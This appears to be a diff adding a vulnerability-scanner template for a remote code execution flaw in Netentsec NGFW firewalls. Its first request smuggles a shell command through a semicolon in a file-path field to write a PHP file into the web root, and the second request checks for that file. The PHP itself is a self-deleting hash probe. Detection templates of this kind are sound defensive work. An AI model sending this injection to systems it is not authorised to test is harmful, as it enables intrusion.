@@ -1,0 +1,45 @@
+id: netentsec-ngfw-rce
+info:
+  name: Netentsec Ngfw Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: rce, ngfw
+  description: |
+    Exploitation of a remote code execution vulnerability in Netentsec NGFW.
+
+variables:
+  r2: "{{rand_base(10)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-payload
+    method: POST
+    path:
+      - "{{BaseURL}}/directdata/direct/router"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5({{r2}});unlink(__FILE__);?>' >/var/www/html/{{r2}}.php"]}],"type":"rpc","tid":17}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SSLVPN_Resource"
+          - "\"result\":{\"success\":true}"
+
+  - id: check-backdoor
+    method: GET
+    path:
+      - "{{BaseURL}}/{{r2}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r2)}}"
